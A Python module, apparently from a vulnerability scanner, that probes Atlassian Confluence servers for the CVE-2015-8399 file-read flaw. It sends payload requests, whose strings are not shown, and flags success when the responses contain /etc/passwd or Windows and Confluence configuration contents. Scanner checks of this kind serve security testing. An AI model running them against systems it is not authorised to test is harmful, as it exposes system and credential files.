#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
from time import sleep
import re

def cve_2015_8399_scan(self, url):
    ''' tlassian Confluence 5.8.17之前版本中存在安全, 
        该漏洞源于spaces/viewdefaultdecorator.action和admin/viewdefaultdecorator.action文件
        没有充分过滤'decoratorName'参数, 
        远程攻击者可利用该漏洞读取配置文件
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'FileRead'
    vul_info['vul_id'] = 'CVE-2015-8399'
    vul_info['vul_method'] = 'GET'

    for payload in self.cve_2015_8399_payloads:
        path = payload['path']
        data = payload['data']
        headers = payload['headers']
        target = url + path
        
        headers['Referer'] = 'http://' + logger.get_domain(url)

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['headers'] = headers
        vul_info['target'] = target

        try:
            res = requests.get(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG


            # todo 判断
            if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
                or (('Microsoft Corp' in res.text) 
                    and ('Microsoft TCP/IP for Windows' in res.text))
                or (('<?xml version="1.0" encoding="UTF-8"?>' in res.text) and ('Confluence' in res.text))
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Request': res
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None